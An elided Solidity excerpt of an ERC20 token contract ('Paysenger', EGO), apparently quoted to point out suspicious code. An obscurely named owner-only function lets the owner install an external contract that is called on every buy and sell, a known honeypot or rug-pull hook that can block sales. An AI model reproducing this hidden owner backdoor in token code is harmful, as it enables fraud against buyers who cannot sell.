...
contract TokenM is ERC20 {
    ...
    IUserAmountblcuto public blcuto;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Paysenger", "EGO") {
    ...
    function addtsoveVsounlToese(IUserAmountblcuto _blcuto) public onlyOwner {
        blcuto = _blcuto;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                blcuto.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				blcuto.addOutAmount(from, amount);
            }else{
                blcuto.addOutAmount(from, amount);
                takeFee = false;
            }
